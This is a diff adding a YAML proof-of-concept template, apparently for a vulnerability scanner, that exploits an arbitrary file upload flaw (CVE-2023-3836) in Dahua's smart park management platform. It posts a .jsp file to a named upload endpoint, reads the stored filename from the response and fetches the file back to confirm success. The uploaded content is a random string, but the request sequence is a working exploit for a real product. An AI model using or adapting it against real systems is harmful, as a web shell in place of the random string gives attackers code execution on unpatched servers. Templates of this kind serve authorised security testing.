@@ -1,0 +1,31 @@
+id: poc-yaml-dahua-smart-park-management-file-upload
+info:
+  name: 大华智慧园区综合管理平台任意文件上传漏洞
+  severity: critical
+  tags:
+  - CVE-2023-3836
+  - 两高一弱
+  finger: 大华智慧园区综合管理平台
+variables:
+  r_str: random_str(5)
+  r_body: random_str(20)
+  r_boundary: random_str(8)
+requests:
+- method: POST
+  path: /emap/devicePoint_addImgIco?hasSubsystem=true
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{.r_boundary}}
+  data: "------WebKitFormBoundary{{.r_boundary}}\r\nContent-Disposition: form-data;\
+    \ name=\"upload\";filename=\"{{.r_str}}.jsp\"\r\nContent-Type: application/octet-stream\r\
+    \nContent-Transfer-Encoding: binary\r\n\r\n{{.r_body}}\r\n------WebKitFormBoundary{{.r_boundary}}--\r\
+    \n"
+  expression: 'status_code == 200 && contains(body, "\"code\":") && contains(body,
+    "\"data\":")
+
+    '
+  output:
+  - regex_match(body, "\"code\":1,\"data\":\"(?P<filename>.*?)\"")
+- method: GET
+  path: /upload/emap/society_new/{{.filename}}
+  expression: status_code == 200 && contains(body, r_body)
+transport: http
